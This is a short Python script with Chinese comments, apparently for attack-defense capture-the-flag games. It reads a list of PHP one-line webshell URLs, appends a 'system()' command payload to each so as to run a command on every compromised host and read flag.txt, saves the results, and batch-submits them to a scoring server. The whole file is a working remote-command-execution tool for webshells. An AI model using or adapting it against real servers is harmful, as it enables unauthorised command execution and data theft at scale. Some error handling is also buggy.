#!/usr/bin/python
#coding=utf-8
import sys,requests,base64,time

#利用一句话木马得到flag

#加载一句话地址的文件
def shell_list(filepath):
    #格式 http://192.168.174.128/test.php?x=
    #返回列表
    try : 
        with open(filepath,encoding='utf-8') as f:
            data = f.readlines()
            return data
    except : 
        print("File"+filepath+" Not Found!") 
        sys.exit()
    
def getflag(filepath):
    file = './flag'+str(time.time())[-5:]+'.txt'
    #加载shell地址
    list = shell_list(filepath)
    #访问 执行查看flag命令  linux就是cat
    cmd = "type flag.txt"
    getflag_cmd ="echo system(\"%s\");"%cmd
    for url in list:
        url  = url.strip('\r\n') + getflag_cmd
        try:
            res = requests.get(url=url,timeout=5)
        except:
            print(url+"[ - ] request timeout [ - ]")
        if res.content:
            content = str(res.content,'utf-8')
            try : 
            #把得到的flag存到flag文件再批量提交
                with open(file,'a',encoding='utf-8') as f:
                    f.writelines(content+"\n")
            except : 
                 print("写flag.txt文件失败！！")
                 sys.exit()
    print("[+] getflag sucessed! flag文件:" +file)
    return file

#批量提交flag
def sentflag(filepath,url):
    filename = getflag(filepath)#返回存放flag的地址
    #读取存放flag文件
    with open(filename,'r',encoding='utf-8') as f:
        flags = f.readlines()
        for flag in flags:
            links = url + flag.strip('\n')
            try : 
                res = requests.get(url=links,timeout=3)
                if res.status_code==200 :
                    print("[ + ] Send Flag  %s Success [ + ]") % flag
            except : 
                 print("[ - ] Send Flag Failed [ - ]")
                 sys.exit()
            
           
#第一个参数需要一个存放shell的地址，格式 http://192.168.174.128/test.php?x=    
#第二个参数需要提交flag的地址 例如http://1.1.1.1/submit.php?token=xxxx&flag=xxxxx
filepath = './webshell.txt'
url = 'http://1.1.1.1/submit.php?token=xxxx&flag=xxxxx'
sentflag(filepath,url)